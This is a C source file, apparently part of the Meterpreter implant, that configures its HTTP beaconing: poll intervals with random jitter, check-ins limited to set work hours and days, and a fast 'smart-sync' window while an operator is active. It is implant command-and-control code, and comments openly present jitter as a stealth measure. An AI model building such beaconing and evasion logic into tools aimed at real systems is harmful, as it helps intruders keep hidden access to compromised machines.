/*!
 * @file core_async.c
 * @brief Handles the core async mode command for HTTP transports.
 */
#include "metsrv.h"

// Delay (in ms) used for the tight poll loop while inside a smart-sync burst
// window. Kept short so that chained multi-request commands (e.g. ls) flow
// without operator wait, but not zero so we don't hammer the transport if
// the framework hasn't queued the next request yet.
#define ASYNC_SMART_SYNC_BURST_MS 1000

/*!
 * @brief Update the last-activity timestamp used by the smart-sync burst window.
 * @param ctx Pointer to the HTTP transport context containing async config.
 */
VOID async_touch_activity(HttpTransportContext* ctx)
{
	if (ctx == NULL)
	{
		return;
	}
	ctx->async_last_activity_ticks = GetTickCount();
}

/*!
 * @brief Determine whether the implant is currently inside a smart-sync burst window.
 * @param ctx Pointer to the HTTP transport context containing async config.
 * @returns TRUE if smart-sync is enabled and recent activity keeps us in-burst.
 */
BOOL async_in_smart_sync_window(HttpTransportContext* ctx)
{
	if (ctx == NULL || ctx->async_smart_sync_seconds == 0)
	{
		return FALSE;
	}

	// GetTickCount() wraps every ~49 days; unsigned subtraction handles the
	// wraparound correctly so long as the window is much smaller than the
	// wrap period (smart_sync is in seconds, so this is trivially true).
	DWORD now = GetTickCount();
	DWORD elapsedMs = now - ctx->async_last_activity_ticks;
	DWORD windowMs = ctx->async_smart_sync_seconds * 1000;
	return elapsedMs < windowMs;
}

/*!
 * @brief Determine if the current local hour falls within business hours on an active day.
 * @param ctx Pointer to the HTTP transport context containing async config.
 * @returns TRUE if currently within configured work hours, FALSE otherwise.
 */
BOOL async_in_work_hours(HttpTransportContext* ctx)
{
	SYSTEMTIME st;
	GetLocalTime(&st);

	// Check if today is an active day (bit 0 = Sunday, bit 6 = Saturday)
	if (ctx->async_work_days != 0)
	{
		UINT dayBit = 1 << st.wDayOfWeek;
		if (!(ctx->async_work_days & dayBit))
		{
			return FALSE;
		}
	}

	// Check if current hour is within work hours
	if (ctx->async_work_start < ctx->async_work_end)
	{
		// Normal range, e.g. 8-17
		if (st.wHour < ctx->async_work_start || st.wHour >= ctx->async_work_end)
		{
			return FALSE;
		}
	}
	else if (ctx->async_work_start > ctx->async_work_end)
	{
		// Overnight range, e.g. 22-6
		if (st.wHour >= ctx->async_work_end && st.wHour < ctx->async_work_start)
		{
			return FALSE;
		}
	}
	// If start == end, treat as 24h (always active)

	return TRUE;
}

/*!
 * @brief Calculate the sleep duration in milliseconds for the current async poll cycle.
 * @param ctx Pointer to the HTTP transport context containing async config.
 * @returns Sleep duration in milliseconds with jitter applied. Returns a short
 *          burst interval (no jitter) when inside the smart-sync window.
 */
DWORD async_calculate_sleep_ms(HttpTransportContext* ctx)
{
	// Smart-sync burst: recent activity implies an operator interaction is in
	// flight; keep polling fast so chained requests complete promptly.
	// Jitter is intentionally skipped inside the burst window — the goal here
	// is responsiveness, not stealth (the operator is already talking to us).
	if (async_in_smart_sync_window(ctx))
	{
		return ASYNC_SMART_SYNC_BURST_MS;
	}

	DWORD intervalMs = ctx->async_poll_interval * 1000;

	if (ctx->async_poll_jitter > 0 && ctx->async_poll_jitter < 100)
	{
		// Apply jitter: interval ± jitter%
		DWORD jitterRange = (intervalMs * ctx->async_poll_jitter) / 100;
		// Random value in range [0, 2*jitterRange], then shift to [-jitterRange, +jitterRange]
		DWORD randVal;
		if (jitterRange > 0)
		{
			randVal = (DWORD)(rand() % (2 * jitterRange + 1));
			intervalMs = intervalMs - jitterRange + randVal;
		}
	}

	return intervalMs;
}

/*!
 * @brief Handle the COMMAND_ID_CORE_ASYNC_MODE request.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_core_async_mode(Remote* remote, Packet* packet)
{
	Packet* response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;
	Transport* transport = remote->transport;

	// Async mode is only supported on HTTP transports
	if (!(transport->type & METERPRETER_TRANSPORT_HTTP))
	{
		dprintf("[ASYNC] Async mode is only supported on HTTP transports");
		result = ERROR_NOT_SUPPORTED;
	}
	else
	{
		HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

		BOOL enabled = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_ASYNC_ENABLED);
		ctx->async_mode = enabled;
		remote->async_mode = enabled;

		if (enabled)
		{
			UINT pollInterval = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_POLL_INTERVAL);
			UINT pollJitter = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_POLL_JITTER);
			UINT workStart = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_START);
			UINT workEnd = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_END);
			UINT workDays = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_DAYS);
			UINT smartSync = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_SMART_SYNC);

			// Apply poll interval (minimum 10 seconds to avoid spin)
			if (pollInterval >= 10)
			{
				ctx->async_poll_interval = pollInterval;
			}
			else if (pollInterval > 0)
			{
				ctx->async_poll_interval = 10;
			}
			else
			{
				// Default to 300 seconds if not specified
				ctx->async_poll_interval = 300;
			}

			// Jitter must be 0-99
			if (pollJitter < 100)
			{
				ctx->async_poll_jitter = pollJitter;
			}
			else
			{
				ctx->async_poll_jitter = 0;
			}

			// Work hours (0-23, end also accepts 24 meaning midnight)
			ctx->async_work_start = (workStart <= 23) ? workStart : 0;
			ctx->async_work_end = (workEnd <= 24) ? workEnd : 0;

			// Work days bitmask (7 bits: bit0=Sun..bit6=Sat)
			ctx->async_work_days = workDays & 0x7F;

			// Smart-sync burst window (seconds). 0 disables the feature and
			// keeps behavior backward compatible with framework versions that
			// don't send the TLV.
			ctx->async_smart_sync_seconds = smartSync;

			// Seed the last-activity timestamp so we don't accidentally start
			// in an "always in burst" state due to an uninitialized value.
			// We deliberately set it far enough in the past that the first
			// check-in uses the normal poll_interval unless a request arrives.
			ctx->async_last_activity_ticks = GetTickCount() - (smartSync * 1000) - 1000;

			// Create the wake event (auto-reset) so sleeps can be interrupted
			if (ctx->async_wake_event == NULL)
			{
				ctx->async_wake_event = CreateEvent(NULL, FALSE, FALSE, NULL);
			}

			dprintf("[ASYNC] Async mode enabled: interval=%us, jitter=%u%%, hours=%u-%u, days=0x%02X, smart_sync=%us",
				ctx->async_poll_interval, ctx->async_poll_jitter,
				ctx->async_work_start, ctx->async_work_end, ctx->async_work_days,
				ctx->async_smart_sync_seconds);
		}
		else
		{
			dprintf("[ASYNC] Async mode disabled");

			// Signal the wake event to interrupt any in-progress async sleep
			if (ctx->async_wake_event != NULL)
			{
				SetEvent(ctx->async_wake_event);
				CloseHandle(ctx->async_wake_event);
				ctx->async_wake_event = NULL;
			}

			ctx->async_poll_interval = 0;
			ctx->async_poll_jitter = 0;
			ctx->async_work_start = 0;
			ctx->async_work_end = 0;
			ctx->async_work_days = 0;
			ctx->async_smart_sync_seconds = 0;
			ctx->async_last_activity_ticks = 0;
		}

		met_api->packet.add_tlv_bool(response, TLV_TYPE_ASYNC_ENABLED, ctx->async_mode);
	}

	met_api->packet.transmit_response(result, remote, response);

	return result;
}
